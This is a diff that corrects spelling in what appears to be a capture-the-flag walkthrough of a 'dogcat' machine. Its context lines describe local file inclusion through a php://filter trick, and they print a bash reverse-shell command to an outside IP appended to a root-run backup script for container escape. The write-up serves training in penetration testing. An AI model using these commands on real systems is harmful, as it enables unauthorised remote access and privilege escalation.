@@ -133,7 +133,7 @@ This fails with the same error as above. So it seems we can only view ".php" fil
 
 ### Log Poisoning
 
-Based on how we can manipulate the view paramenter, this page may be vulnerable to [Local File Inclusion](https://blog.sqreen.com/local-file-inclusions-explained/).
+Based on how we can manipulate the view parameter, this page may be vulnerable to [Local File Inclusion](https://blog.sqreen.com/local-file-inclusions-explained/).
 
 With 'php://filter/convert.base64-encode/resource=' we can convert the given resource to base64
 With './cat/../index' we add they keyword cat and move back to the main web folder and choose index.php
@@ -344,7 +344,7 @@ or search for newest files
 find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print
 ```
 
-We find that "backup.tar" was last udpated and it is updated every minute!
+We find that "backup.tar" was last updated and it is updated every minute!
 It seems as if the backup is created using the shell script in the same folder.
 
 This looks promising: We are root in a container that hosts the dogcat website and there is a script triggered from outside of the container running the "backup.sh" script (that we are able to edit) every minute.
@@ -363,7 +363,7 @@ Then append the bash reverse shell to the backup script:
 echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh
 ```
 
-After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system.
+After waiting at most 59 seconds the backup job will trigger, run our modified script and we get another shell from the container host system.
 
 Running ```whoami``` we can see that we are root - whoop whoop!
 
